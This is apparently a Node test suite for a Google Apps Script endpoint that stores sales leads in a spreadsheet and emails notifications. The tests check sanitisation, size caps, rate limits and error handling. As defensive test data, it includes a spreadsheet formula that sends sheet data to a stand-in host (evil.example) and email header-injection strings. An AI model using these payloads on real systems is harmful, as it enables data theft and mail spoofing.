/**
 * Tests for capture/Code.gs. Runs the real script in Node with the Apps Script
 * services stubbed out, so there is nothing to install:
 *
 *   node --test capture/Code.test.mjs
 */
import { test } from "node:test";
import assert from "node:assert/strict";
import { readFileSync } from "node:fs";
import { fileURLToPath } from "node:url";
import { dirname, join } from "node:path";
import vm from "node:vm";

const source = readFileSync(join(dirname(fileURLToPath(import.meta.url)), "Code.gs"), "utf8");

/** A fresh script instance with fake Sheet, Cache, Lock and Mail services. */
function boot({ lockFree = true, mailThrows = false, sheetThrows = false } = {}) {
  const rows = [];
  const mails = [];
  const store = new Map();
  const logged = [];
  let header = null;

  const sheet = {
    getRange: () => ({ getValues: () => [header], setValues: (v) => { header = v[0]; } }),
    setFrozenRows() {},
    appendRow: (r) => { if (sheetThrows) throw new Error("SECRET internal sheet failure at Code.gs:99"); rows.push(r); },
    getLastRow: () => rows.length + 1,
  };
  const ctx = vm.createContext({
    SpreadsheetApp: { getActiveSpreadsheet: () => ({ getSheetByName: () => sheet, insertSheet: () => sheet }) },
    LockService: { getScriptLock: () => ({ tryLock: () => lockFree, releaseLock() {} }) },
    CacheService: { getScriptCache: () => ({ get: (k) => store.get(k) ?? null, put: (k, v) => store.set(k, v) }) },
    MailApp: { sendEmail: (to, subject, body, options) => { if (mailThrows) throw new Error("mail down"); mails.push({ to, subject, body, options }); } },
    ContentService: {
      MimeType: { JSON: "json" },
      createTextOutput: (s) => ({ s, setMimeType() { return this; } }),
    },
    console: { error: (...a) => logged.push(a.join(" ")) , log() {} },
  });
  vm.runInContext(source, ctx);
  header = ctx.COLUMNS.slice();

  const post = (body) => {
    const contents = typeof body === "string" ? body : JSON.stringify(body);
    return JSON.parse(ctx.doPost({ postData: { contents } }).s);
  };
  return { ctx, rows, mails, logged, post };
}

const good = (over = {}) => ({
  lead_id: "anon_1234", name: "Priya Raman", email: "priya@northwind.com", company: "Northwind Labs",
  seniority: "Founder / CEO", size: "51-200", intent: "hiring_now", track: "Growth / GTM",
  score: 84, probability: "0.841", engagement: "0.62", source: "direct", device: "desktop",
  note: "Let's talk.", ...over,
});

/* ---------- the happy path ---------- */

test("a normal record is stored and notified", () => {
  const t = boot();
  assert.deepEqual(t.post(good()), { ok: true });
  assert.equal(t.rows.length, 1);
  const r = t.rows[0];
  assert.equal(r[1], "anon_1234");
  assert.equal(r[2], "Priya Raman");
  assert.equal(r[9], 84);
  assert.equal(r[10], 0.841);
  assert.equal(r[11], 0.62);
  assert.equal(t.mails.length, 1);
  assert.equal(t.mails[0].subject, "Lead 84/100 — Priya Raman @ Northwind Labs");
  assert.equal(t.mails[0].options.replyTo, "priya@northwind.com");
});

/* ---------- formula injection ---------- */

test("numeric fields can never arrive as a formula", () => {
  const t = boot();
  const evil = '=IMPORTDATA("https://evil.example/?d="&JOIN(",",D:D))';
  t.post(good({ score: evil, probability: evil, engagement: evil }));
  assert.equal(t.rows.length, 1);
  const [, , , , , , , , , score, prob, eng] = t.rows[0];
  assert.deepEqual([score, prob, eng], ["", "", ""]);
  assert.ok(!t.rows[0].some((c) => typeof c === "string" && /IMPORTDATA/.test(c) && !c.startsWith("'")));
});

test("text fields that start like a formula are stored as text", () => {
  const t = boot();
  t.post(good({ name: "=1+1", company: "+SUM(A1)", note: "@cmd", source: "-2+3", intent: "=HYPERLINK()" }));
  const r = t.rows[0];
  assert.equal(r[2], "'=1+1");
  assert.equal(r[4], "'+SUM(A1)");
  assert.equal(r[14], "'@cmd");
  assert.equal(r[12], "'-2+3");
  assert.equal(r[7], "'=HYPERLINK()");
});

test("a formula hidden behind a leading newline or tab is still neutralised", () => {
  const t = boot();
  t.post(good({ name: "\n=1+1", company: "\t=1+1", note: "\r\n=1+1" }));
  const r = t.rows[0];
  assert.equal(r[2], "'=1+1");
  assert.equal(r[4], "'=1+1");
  assert.equal(r[14], "'=1+1");
});

test("numbers are clamped and rounded", () => {
  const t = boot();
  t.post(good({ score: 250, probability: "0.7701234", engagement: -4 }));
  const r = t.rows[0];
  assert.equal(r[9], 100);
  assert.equal(r[10], 0.77);
  assert.equal(r[11], 0);
});

/* ---------- shape and size ---------- */

test("unknown fields are dropped", () => {
  const t = boot();
  t.post(good({ is_admin: true, __proto__: { x: 1 }, extra: "hello" }));
  assert.equal(t.rows[0].length, 15);
  assert.ok(!t.rows[0].includes("hello"));
});

test("text is length-capped and control characters are removed", () => {
  const t = boot();
  t.post(good({ name: "A".repeat(500), note: "x".repeat(5000).slice(0, 2000) + "\u0000\u0007" }));
  const r = t.rows[0];
  assert.equal(r[2].length, 60);
  assert.equal(r[14].length, 800);
  assert.ok(!/[\u0000-\u0008]/.test(r[14]));
});

test("a newline in the name cannot reach the email subject", () => {
  const t = boot();
  t.post(good({ name: "Eve\nBcc: attacker@evil.example", company: "Acme\r\nX-Injected: 1" }));
  assert.ok(!/[\r\n]/.test(t.mails[0].subject));
});

test("a malformed email is dropped and never becomes reply-to", () => {
  const t = boot();
  t.post(good({ email: "not an email\nBcc: x@y.z" }));
  assert.equal(t.rows[0][3], "");
  assert.equal(t.mails[0].options.replyTo, undefined);
});

test("non-string values in text fields are ignored, not stringified", () => {
  const t = boot();
  t.post(good({ name: { toString: "x" }, company: ["a", "b"], note: null }));
  const r = t.rows[0];
  assert.equal(r[2], "");
  assert.equal(r[4], "");
  assert.equal(r[14], "");
});

for (const [label, body] of [
  ["not JSON", "hello"],
  ["a JSON array", "[1,2,3]"],
  ["JSON null", "null"],
  ["a JSON string", '"hi"'],
  ["an empty body", ""],
]) {
  test(`rejects ${label}`, () => {
    const t = boot();
    assert.deepEqual(t.post(body), { ok: false, error: "bad_request" });
    assert.equal(t.rows.length, 0);
  });
}

test("rejects a request with no body at all", () => {
  const t = boot();
  assert.deepEqual(JSON.parse(t.ctx.doPost({}).s), { ok: false, error: "bad_request" });
  assert.deepEqual(JSON.parse(t.ctx.doPost(undefined).s), { ok: false, error: "bad_request" });
});

test("rejects an oversized body before parsing it", () => {
  const t = boot();
  assert.deepEqual(t.post(JSON.stringify(good({ note: "x".repeat(20000) }))), { ok: false, error: "too_large" });
  assert.equal(t.rows.length, 0);
});

test("body size is measured in bytes, not characters", () => {
  const t = boot();
  // 3,000 three-byte characters is 9 KB of UTF-8 but only 3,000 characters.
  const r = t.post(JSON.stringify(good({ note: "€".repeat(3000) })));
  assert.deepEqual(r, { ok: false, error: "too_large" });
});

test("rejects a missing or malformed lead_id", () => {
  const t = boot();
  for (const id of [undefined, "", "has space", "a".repeat(40), "x'; DROP", "=cmd"]) {
    assert.deepEqual(t.post(good({ lead_id: id })), { ok: false, error: "bad_request" }, String(id));
  }
  assert.equal(t.rows.length, 0);
});

/* ---------- limits ---------- */

test("caps submissions per hour across all visitors", () => {
  const t = boot();
  const cap = t.ctx.LIMITS.rowsPerHour;
  for (let i = 0; i < cap; i++) assert.equal(t.post(good({ lead_id: "anon_" + i })).ok, true, "row " + i);
  assert.deepEqual(t.post(good({ lead_id: "anon_next" })), { ok: false, error: "rate_limited" });
  assert.equal(t.rows.length, cap);
});

test("caps how often one lead_id can submit", () => {
  const t = boot();
  const cap = t.ctx.LIMITS.perLeadPer6h;
  for (let i = 0; i < cap; i++) assert.equal(t.post(good()).ok, true);
  assert.deepEqual(t.post(good()), { ok: false, error: "rate_limited" });
  assert.equal(t.post(good({ lead_id: "anon_other" })).ok, true, "a different lead is unaffected");
});

test("past the daily mail cap rows are still stored, just not emailed", () => {
  const t = boot();
  t.ctx.LIMITS.mailsPerDay = 2;
  for (let i = 0; i < 5; i++) t.post(good({ lead_id: "anon_" + i }));
  assert.equal(t.rows.length, 5);
  assert.equal(t.mails.length, 2);
});

test("stops accepting rows once the sheet is full", () => {
  const t = boot();
  t.ctx.LIMITS.maxRows = 0;
  assert.deepEqual(t.post(good()), { ok: false, error: "full" });
  assert.equal(t.rows.length, 0);
});

test("a busy lock is reported, and nothing is written", () => {
  const t = boot({ lockFree: false });
  assert.deepEqual(t.post(good()), { ok: false, error: "busy" });
  assert.equal(t.rows.length, 0);
});

test("a rejected request does not use up the rate limit", () => {
  const t = boot();
  for (let i = 0; i < 50; i++) t.post("junk");
  assert.equal(t.post(good()).ok, true);
});

/* ---------- failure handling ---------- */

test("a mail failure does not lose the lead", () => {
  const t = boot({ mailThrows: true });
  assert.deepEqual(t.post(good()), { ok: true });
  assert.equal(t.rows.length, 1);
  assert.ok(t.logged.some((l) => /mail down/.test(l)));
});

test("internal errors are logged but never leaked to the caller", () => {
  const t = boot({ sheetThrows: true });
  const res = t.post(good());
  assert.deepEqual(res, { ok: false, error: "server_error" });
  assert.ok(!JSON.stringify(res).includes("SECRET"));
  assert.ok(t.logged.some((l) => /SECRET/.test(l)), "details should reach the script log");
});

test("doGet only confirms the service is alive", () => {
  const t = boot();
  assert.deepEqual(JSON.parse(t.ctx.doGet().s), { ok: true, service: "gtm-scoring-console capture" });
});
